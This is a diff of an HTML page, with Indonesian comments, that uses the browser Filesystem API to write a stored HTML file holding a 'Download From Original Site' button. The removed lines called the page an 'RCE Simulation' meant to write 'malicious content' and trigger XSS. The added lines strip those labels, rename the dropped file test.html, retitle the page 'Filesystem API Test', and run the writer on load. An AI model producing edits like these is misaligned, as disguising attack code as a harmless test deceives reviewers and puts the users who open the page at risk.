@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Filesystem API Test with RCE Simulation</title>
+    <title>Filesystem API Test</title>
     <script>
         function createFile() {
             // Ukuran storage yang diminta (1MB)
@@ -13,15 +14,14 @@
             window.webkitRequestFileSystem(window.PERSISTENT, storageSize, function(fs) {
                 console.log("Filesystem berhasil diakses:", fs);
 
-                // Buat file "pizza.html"
-                fs.root.getFile("pizza.html", { create: true, exclusive: false }, function(fileEntry) {
+                // Buat file "test.html"
+                fs.root.getFile("test.html", { create: true, exclusive: false }, function(fileEntry) {
                     console.log("File berhasil dibuat:", fileEntry.toURL());
 
                     // Buat writer untuk menulis ke file
                     fileEntry.createWriter(function(fileWriter) {
-                        // Simulasi RCE menggunakan href untuk membuka aplikasi lokal (misalnya kalkulator)
-                        let blob = new Blob([`
-                            <html>
+                        // Pastikan HTML dibungkus dalam string yang benar
+                        let blob = new Blob([`<html>
  <head> 
   <meta charset="utf-8">
 <style>
@@ -50,24 +50,16 @@ function a(){
 </script> 
   <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
  </body>
-</html>
-                        `], { type: "text/html" });
+</html>`], { type: "text/html" });
 
-                        // Menulis blob ke file
                         fileWriter.onwriteend = function() {
                             console.log("File berhasil ditulis:", fileEntry.toURL());
-
-                            // Memuat file yang sudah ditulis ke dalam iframe untuk men-trigger XSS atau konten berbahaya
-                            let iframe = document.createElement("iframe");
-                            iframe.src = fileEntry.toURL();
-                            document.body.appendChild(iframe);
                         };
 
                         fileWriter.onerror = function(err) {
                             console.error("Gagal menulis file:", err);
                         };
 
-                        // Menulis blob ke dalam file
                         fileWriter.write(blob);
                     });
 
@@ -80,13 +72,12 @@ function a(){
             });
         }
 
-        // Panggil fungsi untuk membuat file ketika halaman dimuat
-        window.onload = createFile;
+        // Jalankan fungsi untuk membuat file
+        createFile();
     </script>
 </head>
 <body>
-    <h1>Filesystem API Test with RCE Simulation</h1>
-    <p>This page is attempting to use the Filesystem API to create a file with malicious content.</p>
-    <iframe src="https://policies.google.com/terms?hl=en"></iframe>
+    <h1>Filesystem API Test</h1>
+    <p>This page is attempting to use the Filesystem API to create a file.</p>
 </body>
 </html>
